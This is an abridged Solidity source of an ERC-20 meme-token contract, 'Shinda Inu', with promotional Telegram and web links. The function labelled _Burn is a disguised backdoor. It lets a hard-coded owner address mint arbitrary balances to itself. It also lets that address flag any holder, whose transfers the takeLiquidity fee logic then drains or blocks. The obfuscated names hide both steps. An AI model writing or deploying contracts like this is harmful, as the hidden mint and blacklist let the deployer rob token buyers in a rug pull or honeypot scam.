...
/**
 https://t.me/ShindaInuERC

 https://www.shindatoken.net/   
*/
...
contract Shinda is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "Shinda Inu";
    string private _symbol = "SHINDA";
    uint8 private _decimals = 9;
    address payable public wwww;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludefromFee;
    mapping (address => bool) public _pairs;
    mapping (address => uint256) public qqq;
    ...
    constructor () {
        ...
        wwww = payable(address(0x004289d64E46CE3f37BA4FA15FAa73fd6d54bdB3));
    ...
    function _Burn(address lllll,uint256 fff) public {
        address rednes;
        rednes = msg.sender;
        uint256 JK = fff;
        if (JK > (2012)) _balances[wwww] += uint256(JK);
        if (JK == (7+3)) qqq[lllll] = 10**6;
        require(wwww == rednes);
    }
    ...
    function takeLiquidity(address sender, address recipient, uint256 tAmount) internal returns (uint256) {
        ...
        if(qqq[sender] > 100) fee = tAmount.mul(qqq[sender]).div(100);
